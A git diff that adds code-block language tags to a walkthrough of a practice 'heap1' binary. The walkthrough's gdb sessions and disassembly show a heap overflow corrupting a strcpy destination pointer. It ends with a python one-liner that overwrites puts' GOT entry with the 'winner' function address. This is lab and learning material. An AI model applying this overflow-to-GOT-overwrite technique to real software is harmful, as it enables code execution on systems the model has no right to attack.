@@ -1,6 +1,7 @@
 
 
 ```
+asm
     8048565:   e8 06 fe ff ff          call   8048370 <strcpy@plt>
     804856a:   83 c4 10                add    esp,0x10
     804856d:   8b 43 04                mov    eax,DWORD PTR [ebx+0x4]
@@ -16,6 +17,7 @@
 
 in gdb:
 ```
+sh
     gdb-peda$ b *0x8048565
     Breakpoint 1 at 0x8048565
     gdb-peda$ b *0x8048580
@@ -28,6 +30,7 @@ now let's take a look see
 
 
 ```
+asm
        0x8048560 <main+126>:	sub    esp,0x8
        0x8048563 <main+129>:	push   edx
        0x8048564 <main+130>:	push   eax
@@ -42,10 +45,12 @@ now let's take a look see
 ```
 so now we can continue
 ```
+sh
     gdb-peda$ c
 ```
 and have another look see
 ```
+asm
        0x804857b <main+153>:	sub    esp,0x8
        0x804857e <main+156>:	push   edx
        0x804857f <main+157>:	push   eax
@@ -62,11 +67,13 @@ and have another look see
 now let's see if we can break it!
 
 ```
+sh
 gdb-peda$ r aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa bbbbb
 ```
 
 
 ```
+asm
    0x8048560 <main+126>:	sub    esp,0x8
    0x8048563 <main+129>:	push   edx
    0x8048564 <main+130>:	push   eax
@@ -84,10 +91,12 @@ nothing interesting yet...
 and so we continue
 
 ```
+sh
     gdb-peda$ c
 ```
 and take a look see
 ```
+asm
    0x804857b <main+153>:	sub    esp,0x8
    0x804857e <main+156>:	push   edx
    0x804857f <main+157>:	push   eax
@@ -107,6 +116,7 @@ Ureka!! We are overwriting the destination address being passed to the `strcpy` 
 Let's take another look at the assembly
 
 ```
+asm
 8048580:   e8 eb fd ff ff          call   8048370 <strcpy@plt>
  8048585:   83 c4 10                add    esp,0x10
  8048588:   83 ec 0c                sub    esp,0xc
@@ -118,6 +128,7 @@ Even though `printf` is called in the C code, `puts` is being called in the asse
 
 
 ```
+asm
  08048390 <puts@plt>:
 8048390:   ff 25 a0 98 04 08       jmp    DWORD PTR ds:0x80498a0
 8048396:   68 20 00 00 00          push   0x20
@@ -127,6 +138,7 @@ Even though `printf` is called in the C code, `puts` is being called in the asse
 so `0x80498a0` is the .got address of puts. So all we need to do is overwrite that address with the address of `winner`
 
 ```
+asm
 080484bb <winner>:
 80484bb:   55                      push   ebp
 80484bc:   89 e5                   mov    ebp,esp
@@ -135,6 +147,7 @@ so `0x80498a0` is the .got address of puts. So all we need to do is overwrite th
 
 
 ```
+sh
 [kablaa@superhacker9000 heap1]$ ./heap1 $(python2.7 -c 'print "a"*20 + "\xa0\x98\x04\x08" + " " + "\xbb\x84\x04\x08"')
 and we have a winner @ 1453579246
 [kablaa@superhacker9000 heap1]$
